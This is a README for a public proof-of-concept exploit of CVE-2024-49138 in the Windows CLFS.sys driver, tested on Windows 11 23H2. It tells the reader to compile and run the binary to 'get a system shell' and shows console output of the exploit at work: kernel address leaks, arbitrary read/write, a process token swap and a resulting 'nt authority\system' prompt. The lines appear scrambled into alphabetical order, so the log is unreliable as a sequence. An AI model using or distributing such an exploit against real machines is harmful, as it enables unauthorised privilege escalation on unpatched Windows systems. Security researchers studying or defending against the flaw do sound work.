
![systemshell](https://github.com/user-attachments/assets/788d4096-1c9c-46a6-ad52-988e6538dd18)
# CVE-2024-49138-POC
## Compile and Run
(c) Microsoft Corporation. All rights reserved.
A thorough analysis will be provided in a detailed blog post.
AddLogContainer successful
C:\Users\IEUser\Desktop>
C:\Users\IEUser\Desktop>whoami
Compile x64 Release version.
CrowdStrike detected the vulnerability actively exploited by threat actors.
Directory created successfully: C:\temp
Kernel Base Address: 0xFFFFF80339800000
Kernel Name: ntoskrnl.exe
Microsoft Windows [Version 10.0.22631.2861]
NtReadVirtualMemory = 0x00007FFFAF0EFB40
NtWriteVirtualMemory = 0x00007FFFAF0EFAA0
Overwriting process token..
PS C:\Users\IEUser\Desktop> .\CVE-2024-49138-POC.exe
PS C:\Users\IEUser\Desktop> whoami
Process priority set to NORMAL_PRIORITY_CLASS.
Process priority set to REALTIME_PRIORITY_CLASS.
Proof of Concept that exploits [CVE-2024-49138](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49138) in CLFS.sys. 
Resource size: 65536 bytes
Resource written to output.bin successfully.
Run and get a system shell.
Tested on **Windows 11 23h2**.
Thread priority set to the highest level: THREAD_PRIORITY_NORMAL.
Thread priority set to the highest level: TIME_CRITICAL.
```
address_to_write = 0xFFFFC201424CC2B2
buf = 0x0000000300905A4D
current token address = 0xFFFFC201423EC578
file opened successfully
hResource = 0x00007FF7CDB89080
hResource = 0x00007FF7CDB890A0
nt authority\system
pResourceData = 0x00007FF7CDB890A0
pcclfscontainer = 0x0000000002100000
reading base of ntoskrnl to check we have arbitrary read/write
swapping tokens...
systemtoken = 0xFFFFD401F501C6E9
token swapped. Restoring PreviousMode and spawning system shell...
triggering vuln...CreateLogFile failed with error 6601
vuln triggered
windows11\ieuser
